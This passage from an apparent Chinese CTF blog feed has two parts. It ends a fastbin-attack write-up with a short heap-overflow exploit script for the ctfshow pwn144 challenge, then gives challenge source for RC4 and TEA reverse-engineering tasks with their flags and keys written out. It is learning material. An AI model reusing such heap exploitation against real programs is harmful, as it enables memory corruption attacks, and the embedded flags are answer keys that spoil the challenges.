的情况。</li></ol></li><li>通过修改fastbin中的thunk-&gt;fd，实现fastbin添加fake_thunk，同样有要求<ol><li>能够写入fastbin中的thunk的内存，一般是堆溢出</li><li>thunk-&gt;size &lt;&#x3D; fake_thunk-&gt;size &lt; thunk-&gt;size + size_t*2</li></ol></li></ol><blockquote><p><code>a</code>的理解很简单：如果不能写入thunk的内存，那么fd就无法修改，也就无法实现fastbin添加</p><p><code>b</code>的理解就有丢丢复杂：要求fake_thunk-&gt;size 必须存在值，且值不能超过thunk-&gt;size + size_t<em>2或者小于thunk-&gt;size。什么意思呢，就是说</em>((size_t*)fake_thunk+1)必须有值；后半句是说，由于你是修改fastbin中已有的thunk-&gt;fd，那么就认为你的fake_thunk-&gt;size和thunk-&gt;size一样，但是可以不完全一样，上图来看看比较好理解</p></blockquote><p><img src="/../Images/1750304580655-0ef5e60c-7e8f-430b-9388-8099681c99f8.png" alt="img"></p><h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshowpwn144-1"><a href="#ctfshowpwn144-1" class="headerlink" title="ctfshowpwn144"></a>ctfshowpwn144</h3><p>edit：存在堆溢出</p><p><img src="/../Images/1750304647419-fd72a8e5-e609-43dc-9e6d-4fbd57f5a0b1.png" alt="img"></p><p>我们的目的是修改magic的值，那么我们就需要布局fake_thunk（第二种添加方法）</p><p><img src="/../Images/1750304729128-0810ea97-af34-4ae4-bfa4-3230729dc214.png" alt="img"></p><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><br>fake_thunk_ptr = <span class="hljs-number">0x0602090</span> - <span class="hljs-number">3</span><br>magic = <span class="hljs-number">0x006020A0</span> + <span class="hljs-number">8</span><br><br>fake_thunk = junk(<span class="hljs-number">0x60</span>)<br>fake_thunk += p(<span class="hljs-number">0</span>)<br>fake_thunk += p(<span class="hljs-number">0x71</span>)<br>fake_thunk += p(fake_thunk_ptr)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_thunk),fake_thunk)<br>    <br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;f&#x27;</span>*(magic - fake_thunk_ptr - <span class="hljs-number">0x10</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x1BF52</span>))<br><br>inter()<br></code></pre></td></tr></table></figure><h4 id="代码解释-3"><a href="#代码解释-3" class="headerlink" title="代码解释"></a>代码解释</h4><p><img src="/../Images/1750305706976-7a5f9851-9523-4d9d-bae4-d82d06f62263.png" alt="img"><br>在布局fake_thunk时</p><p>stdin@@GLIBC_2_2_5，在elf文件映射内存的时一般都在高位地址上，也就是0x000070<strong><strong><strong><strong><strong>~0x00007F</strong></strong></strong></strong></strong>，那么就可以构造一个thunk-&gt;size &#x3D; 0x71，实现添加fake_thunk</p><p>这里还有个问题，就是说，如果我们把fake_thunk =&#x3D; 0x0602090，那么fake_thunk-&gt;size &#x3D;&#x3D;0，就无法申请到fake_thunk的地址，那么我们就需要把[0x70~0x7f]从fake_thunk-&gt;prev_size挪到fake_thunk-&gt;size上。其在高三位上，那么stdin@@GLIBC_2_2_5-3，把它顶出去就ok</p><p><img src="/../Images/1750305216074-c519bdc4-d44f-425e-9665-f439b4f39f40.png" alt="img"></p><p><img src="/../Images/1750305287345-d4b0addb-2a46-4abb-ad33-922d4c5fd760.png" alt="img"></p><p><img src="/../Images/1750305960566-00a2b71e-ab54-4820-b7c9-bbf636da2c22.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HEAP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Record-Topic</title>
    <link href="/Record-Topic/"/>
    <url>/Record-Topic/</url>
    
    <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><h2 id="Rc4-1"><a href="#Rc4-1" class="headerlink" title="Rc4_1"></a>Rc4_1</h2><blockquote><p>Rc4变种</p><p>考察</p><ul><li>指针的使用</li><li>理解Rc4</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;HeaderFile/DataType.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdio&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdlib&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstring&quot;</span></span><br><br>byte key[] = <span class="hljs-string">&quot;5ew_3eme3t2r_n2w_atm03ph2re!&quot;</span>;<br><span class="hljs-comment">//byte flag[] = &quot;flag&#123;Wow_you_actually_mastered_c4!&#125;&quot;;</span><br>byte ans[] = &#123;<span class="hljs-number">0xb2</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x8c</span>,<span class="hljs-number">0xc0</span>,<br>              <span class="hljs-number">0xfb</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0xf9</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x75</span>,&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;New semester, I think you already know what c4 is&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now, give me your c4&quot;</span>);<br>    byte *flag = (byte*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br><br>    dword key_length = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)key);<br>    dword* kye = (dword*)key;<br>    word S[<span class="hljs-number">512</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; ++i) S[i] = i&amp;<span class="hljs-number">0xff</span>;<br>    word j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; ++i) &#123;<br>        j = i + S[i] + (*kye);<br>        j %= <span class="hljs-number">256</span>;<br>        word tmp = S[i];<br>        S[i] = S[j];<br>        S[j] = tmp;<br>    &#125;<br>    byte *K = (byte*) <span class="hljs-built_in">malloc</span>(key_length);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; ++i) &#123;<br>        j = S[i] % <span class="hljs-number">512</span>;<br>        K[i%key_length] = S[(S[i] + S[j])%<span class="hljs-number">512</span>];<br>    &#125;<br>    byte flag_len = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) flag);<br>    <span class="hljs-keyword">if</span>(flag) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; flag_len; ++i) &#123;<br>            *(flag + i) ^= K[i%key_length] ^ *(kye + (i % <span class="hljs-number">7</span>));<br>            <span class="hljs-keyword">if</span>(*(flag + i) != ans[i])&#123;<br>                perror(<span class="hljs-string">&quot;Learn more!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]\tGreat!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(K);<br>    <span class="hljs-built_in">free</span>(flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Rc4-2"><a href="#Rc4-2" class="headerlink" title="Rc4_2"></a>Rc4_2</h2><blockquote><p>Rc4变种</p><p>考察</p><ul><li>指针的使用</li><li>代码改写</li><li>理解Rc4</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/Rc4.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;HeaderFile/DataType.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdio&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstring&quot;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> 75,50,129,254,190,124,8,162,93,217,159,120,91,2,143,187,124,150,153,6,156,245,190,89,240,71,195,107,184,166,131</span><br><span class="hljs-comment"> flag&#123;T3e_b2st_Alg0r1thm_ls_Rc4&#125;</span><br><span class="hljs-comment"> D1_y3u_know_RC4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">KSA</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, dword key_length, byte *S)</span> &#123;<br>    dword i, j = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) S[i] = i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span>;<br>        byte temp = S[i];<br>        S[i] = S[j];<br>        S[j] = temp;<br>    &#125;<br>&#125;<br><br>byte <span class="hljs-title function_">PRGA</span><span class="hljs-params">(byte *S)</span> &#123;<br>    <span class="hljs-type">static</span> dword i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    j = (j + S[i]) % <span class="hljs-number">256</span>;<br>    byte temp = S[i];<br>    S[i] = S[j];<br>    S[j] = temp;<br>    byte K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>] ^ S[i];<br>    <span class="hljs-keyword">return</span> K;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">CheckFlag</span><span class="hljs-params">(dword plaintext_length, <span class="hljs-type">char</span>* flag, byte* S,byte* Ans)</span>&#123;<br>    <span class="hljs-keyword">for</span> (dword k = <span class="hljs-number">0</span>; k &lt; plaintext_length; k++) &#123;<br>        <span class="hljs-keyword">if</span>((flag[k] ^ PRGA(S)) != Ans[k])<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-comment">//        printf(&quot;%d,&quot;,ciphertext_byte);</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">RC4</span><span class="hljs-params">(<span class="hljs-type">char</span>* key,<span class="hljs-type">char</span>* plaintext,byte* Ans)</span> &#123;<br><br><span class="hljs-comment">//    puts(&quot;Welcome to the world of bombs!&quot;);</span><br><br>    dword key_length = <span class="hljs-built_in">strlen</span>(key);<br><br>    dword plaintext_length = <span class="hljs-built_in">strlen</span>(plaintext);<br><br>    byte S[<span class="hljs-number">256</span>];<br>    KSA(key, key_length, S);<br><br>    <span class="hljs-keyword">if</span>(CheckFlag(plaintext_length,plaintext,S,Ans))&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!]\tYou already know what Rc4 is\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><h2 id="丢丢茶"><a href="#丢丢茶" class="headerlink" title="丢丢茶"></a>丢丢茶</h2><blockquote><p>Tea变种</p><p>考点</p><ul><li>段错误的处理</li><li>DLL 释放、载入</li><li>Tea算法理解</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdio&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstdlib&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;cstring&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;csetjmp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;csignal&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint8_t</span> byte;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint16_t</span> word;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint32_t</span> dword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">uint64_t</span> qword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">qword</span> <span class="hljs-params">(__stdcall *lpPlus)</span><span class="hljs-params">(qword,qword)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">qword</span> <span class="hljs-params">(__stdcall *lpMul)</span><span class="hljs-params">(qword,qword)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">qword</span> <span class="hljs-params">(__stdcall *lpXor)</span><span class="hljs-params">(qword,qword)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">bool</span> <span class="hljs-params">(__stdcall *lpCheck)</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br>dword flag_len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Function</span>&#123;</span><br>    HMODULE h;<br>    lpXor aXor;<br>    lpMul mul;<br>    lpPlus plus;<br>    <span class="hljs-type">char</span>* key;<br>    dword* delta;<br>    lpCheck Check;<br>&#125;function;<br><br>byte * DllData;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">LoadFunction</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> Allpath[MAX_PATH];<br>    GetTempPath(MAX_PATH,Allpath);<br>    <span class="hljs-built_in">snprintf</span>(Allpath,MAX_PATH,<span class="hljs-string">&quot;%sEnc&quot;</span>,Allpath);<br>    function.h = LoadLibrary(Allpath);<br>    function.plus = (lpPlus ) GetProcAddress(function.h,(<span class="hljs-type">char</span>*)<span class="hljs-number">1</span>);<br>    function.mul = (lpMul ) GetProcAddress(function.h, (<span class="hljs-type">char</span>*)<span class="hljs-number">3</span>);<br>    function.aXor = (lpXor ) GetProcAddress(function.h,(<span class="hljs-type">char</span>*)<span class="hljs-number">5</span>);<br>    function.delta = (dword*) GetProcAddress(function.h,(<span class="hljs-type">char</span>*)<span class="hljs-number">11</span>);<br>    function.key = (<span class="hljs-type">char</span>*) GetProcAddress(function.h,(<span class="hljs-type">char</span>*)<span class="hljs-number">10</span>);<br>    function.Check = (lpCheck ) GetProcAddress(function.h,(<span class="hljs-type">char</span>*)<span class="hljs-number">12</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Encrypt</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span>&#123;<br>    dword* enc = (dword*)flag;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; flag_len; i+=<span class="hljs-number">2</span>) &#123;<br>        dword sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; ++j) &#123;<br>            sum += *(function.delta);<br>            enc[i] += ((dword)function.mul(enc[i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) + *(dword*)(function.key)) ^ (dword)function.plus(enc[i+<span class="hljs-number">1</span>] , sum) ^ ((enc[i+<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">5</span>) + *(dword*)(function.key+<span class="hljs-number">1</span>));<br>            enc[i+<span class="hljs-number">1</span>] += ((dword)function.mul(enc[i],<span class="hljs-number">16</span>) + *(dword*)(function.key+<span class="hljs-number">2</span>)) ^ (dword)function.plus(enc[i] , sum) ^ ((enc[i]&gt;&gt;<span class="hljs-number">5</span>) + *(dword*)(function.key+<span class="hljs-number">3</span>));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Buy you a cup of tea, brother!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You got a cup or something? Give it to me:&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Check</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span>&#123;<br>    <span class="hljs-keyword">if</span>(function.Check(flag))&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right,Now enjoy your tea&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Noooooooo!&quot;</span>);<br><br>&#125;<br><br>jmp_buf jumpBuffer;<br><span class="hljs-type">void</span> <span class="hljs-title function_">signalHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (sig == SIGSEGV) &#123;<br>        longjmp(jumpBuffer, <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">LoadDll</span><span class="hljs-params">()</span>&#123;<br>    FILE* fp = fopen(<span class="hljs-string">&quot;Enc.dll&quot;</span>,<span class="hljs-string">&quot;r+b&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fp)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file does not exist!&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    qword DllSize = ftell(fp);<br>    rewind(fp);<br><br>    DllData = (byte*)<span class="hljs-built_in">malloc</span>(DllSize);<br>    fread(DllData,<span class="hljs-number">1</span>,DllSize,fp);<br>    qword e_lfanew = *(dword*)(DllData+<span class="hljs-number">0x3c</span>);<br>    qword NumberOfSection = *(word*)(DllData+e_lfanew+<span class="hljs-number">0x6</span>);<br>    qword OpHeaderSize = *(word*)(DllData+e_lfanew+<span class="hljs-number">0x14</span>);<br>    qword SectionPtr = (e_lfanew+<span class="hljs-number">0x18</span>+OpHeaderSize);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3c</span>; ++i)<br>        <span class="hljs-keyword">if</span>(*(DllData+i))*(DllData+i) ^= NumberOfSection;<br><br>    <span class="hljs-built_in">memset</span>(DllData+<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> tell[] =<span class="hljs-string">&quot;Is this really a dll? ty is lying to me, damn ty!&quot;</span>;<br>    <span class="hljs-built_in">memcpy</span>(DllData+<span class="hljs-number">0x40</span>,tell, <span class="hljs-built_in">strlen</span>(tell));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x24</span>; ++i)<br>        <span class="hljs-keyword">if</span>(*(DllData + SectionPtr + i))*(DllData + SectionPtr + i) ^= NumberOfSection;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x6</span>; ++i)<br>        <span class="hljs-keyword">if</span>(*(DllData+e_lfanew+i))*(DllData+e_lfanew+i) ^= NumberOfSection;<br><br>    <span class="hljs-type">char</span> TempPath[MAX_PATH];<br>    GetTempPath(MAX_PATH,TempPath);<br>    <span class="hljs-built_in">snprintf</span>(TempPath,MAX_PATH,<span class="hljs-string">&quot;%sEnc.dll&quot;</span>,TempPath);<br>    fp = fopen(TempPath,<span class="hljs-string">&quot;w+b&quot;</span>);<br>    fwrite(DllData,<span class="hljs-number">1</span>,DllSize,fp);<br>    fclose(fp);<br>    <span class="hljs-built_in">free</span>(DllData);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    LoadDll();<br>    signal(SIGSEGV, signalHandler);<br>    <span class="hljs-type">char</span>* flag = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    hello();<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    flag_len = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)flag)/<span class="hljs-number">4</span>;<br><br>    <span class="hljs-keyword">if</span>(setjmp(jumpBuffer) == <span class="hljs-number">0</span>)&#123;<br>        Encrypt(flag);<br>        Check(flag);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        perror(<span class="hljs-string">&quot;Eorrrrrrr&quot;</span>);<br>        Sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hold on, fixing error.......&quot;</span>);<br>        Sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Dont!&quot;</span>);<br>        Sleep(<span class="hljs-number">1000</span>);<br>        system(<span class="hljs-string">&quot;CLS&quot;</span>);<br>        Sleep(<span class="hljs-number">1000</span>);<br>        LoadFunction();<br>        Encrypt(flag);<br>        